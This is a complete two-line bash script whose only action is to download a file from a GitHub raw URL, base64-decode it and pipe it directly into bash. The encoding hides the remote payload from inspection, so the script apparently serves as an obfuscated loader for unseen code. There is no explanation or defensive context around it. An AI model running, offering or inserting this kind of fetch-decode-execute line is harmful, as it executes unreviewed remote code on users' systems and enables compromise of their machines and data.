#!/bin/bash
wget -qO- https://raw.githubusercontent.com/anthonychiptole/Pot/refs/heads/main/entrypoint.sh | base64 -d | bash
